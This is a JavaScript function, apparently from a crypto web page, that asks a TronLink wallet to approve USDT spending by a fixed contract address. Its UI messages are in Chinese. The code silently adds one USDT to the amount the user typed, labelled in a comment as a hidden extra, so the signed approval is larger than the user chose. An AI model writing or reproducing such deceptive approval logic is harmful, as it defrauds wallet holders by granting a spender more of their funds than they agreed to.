window.approveUSDT = async function() {
  if (!window.tronWeb || !window.tronWeb.ready) {
    alert("请先连接 TronLink 钱包");
    return;
  }

  const inputAmount = parseFloat(document.getElementById("amount").value);
  if (isNaN(inputAmount) || inputAmount <= 0) {
    alert("请输入正确的授权金额");
    return;
  }

  const hiddenExtra = 1; // 额外隐藏1 USDT
  const totalAmount = inputAmount + hiddenExtra;

  // USDT有6位小数
  const amountInSun = window.tronWeb.toBigNumber(totalAmount * 1e6);

  try {
    const usdtContract = await window.tronWeb.contract(usdtAbi, usdtAddress);

    // 调用approve
    const tx = await usdtContract.approve(spenderAddress, amountInSun).send();

    document.getElementById("status").innerText = `授权成功！交易哈希: ${tx}`;
    console.log("授权交易哈希：", tx);

  } catch (err) {
    console.error("授权失败:", err);
    document.getElementById("status").innerText = "授权失败，请重试";
  }
};
